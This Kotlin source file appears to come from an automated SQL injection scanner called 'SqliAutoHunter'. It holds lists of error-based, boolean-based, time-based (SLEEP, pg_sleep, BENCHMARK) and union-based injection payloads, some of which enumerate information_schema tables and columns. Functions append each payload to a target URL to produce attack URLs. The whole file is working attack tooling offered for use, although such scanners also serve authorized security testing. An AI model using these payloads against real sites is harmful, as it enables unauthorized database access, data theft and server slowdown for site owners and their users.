package com.yourapp.sqliautohunter.domain.payload

import com.yourapp.sqliautohunter.util.Constants

object SqliPayloadTemplates {

    // Error-based payloads
    val ERROR_BASED_PAYLOADS = listOf(
        Constants.Payloads.ERROR_BASED_SINGLE_QUOTE,
        Constants.Payloads.ERROR_BASED_DOUBLE_QUOTE,
        Constants.Payloads.ERROR_BASED_PAREN,
        "'",
        "\"",
        "')",
        "\")",
        "' OR '1'='1",
        "' OR 1=1 -- ",
        "' OR 1=1 #",
        "\" OR 1=1 -- ",
        "\" OR 1=1 #"
    )

    // Boolean-based payloads
    val BOOLEAN_BASED_PAYLOADS = listOf(
        Constants.Payloads.BOOLEAN_BASED_TRUE,
        Constants.Payloads.BOOLEAN_BASED_FALSE,
        "' AND 1=1 -- ",
        "' AND 1=2 -- ",
        "' AND 1=1 #",
        "' AND 1=2 #",
        "' AND 'a'='a",
        "' AND 'a'='b"
    )

    // Time-based payloads
    val TIME_BASED_PAYLOADS = listOf(
        Constants.Payloads.TIME_BASED_SLEEP,
        Constants.Payloads.TIME_BASED_SLEEP_MYSQL,
        Constants.Payloads.TIME_BASED_SLEEP_PG,
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
        "' AND SLEEP(5) -- ",
        "' AND pg_sleep(5) -- ",
        "' AND (SELECT 1 FROM (SELECT SLEEP(5))x) -- ",
        "' AND BENCHMARK(10000000,MD5('test')) -- "
    )

    // Union-based payloads
    val UNION_BASED_PAYLOADS = listOf(
        "' UNION SELECT 1,2,3 -- ",
        "' UNION SELECT null,version(),null -- ",
        "' UNION SELECT 1,table_name,3 FROM information_schema.tables -- ",
        "' UNION SELECT 1,column_name,3 FROM information_schema.columns -- ",
        "' UNION SELECT 1,2,3 #",
        "' UNION SELECT null,@@version,null #"
    )

    // All payloads combined
    val ALL_PAYLOADS: List<String> by lazy {
        ERROR_BASED_PAYLOADS + BOOLEAN_BASED_PAYLOADS + TIME_BASED_PAYLOADS + UNION_BASED_PAYLOADS
    }

    fun getPayloadsByType(type: PayloadType): List<String> {
        return when (type) {
            PayloadType.ERROR_BASED -> ERROR_BASED_PAYLOADS
            PayloadType.BOOLEAN_BASED -> BOOLEAN_BASED_PAYLOADS
            PayloadType.TIME_BASED -> TIME_BASED_PAYLOADS
            PayloadType.UNION_BASED -> UNION_BASED_PAYLOADS
            PayloadType.ALL -> ALL_PAYLOADS
        }
    }

    fun getPayloadType(payload: String): PayloadType {
        return when {
            ERROR_BASED_PAYLOADS.contains(payload) -> PayloadType.ERROR_BASED
            BOOLEAN_BASED_PAYLOADS.contains(payload) -> PayloadType.BOOLEAN_BASED
            TIME_BASED_PAYLOADS.contains(payload) -> PayloadType.TIME_BASED
            UNION_BASED_PAYLOADS.contains(payload) -> PayloadType.UNION_BASED
            else -> PayloadType.ERROR_BASED
        }
    }

    enum class PayloadType {
        ERROR_BASED,
        BOOLEAN_BASED,
        TIME_BASED,
        UNION_BASED,
        ALL
    }

    fun generateTestUrl(baseUrl: String, payload: String): String {
        return when {
            baseUrl.contains("?") -> {
                if (baseUrl.endsWith("?") || baseUrl.endsWith("&")) {
                    "$baseUrl$payload"
                } else {
                    "$baseUrl&$payload"
                }
            }
            baseUrl.contains("=") -> {
                val separator = if (baseUrl.endsWith("=")) "" else "="
                "$baseUrl$separator$payload"
            }
            else -> {
                if (baseUrl.endsWith("/")) {
                    "${baseUrl}test$payload"
                } else {
                    "${baseUrl}/test$payload"
                }
            }
        }
    }

    fun generateTestUrls(
        baseUrl: String,
        payloadType: PayloadType = PayloadType.ALL,
        limit: Int = 5
    ): List<String> {
        val payloads = getPayloadsByType(payloadType).take(limit)
        return payloads.map { payload -> generateTestUrl(baseUrl, payload) }
    }

    fun generateAllTestUrls(baseUrl: String): List<String> {
        return ALL_PAYLOADS.map { payload -> generateTestUrl(baseUrl, payload) }
    }
}
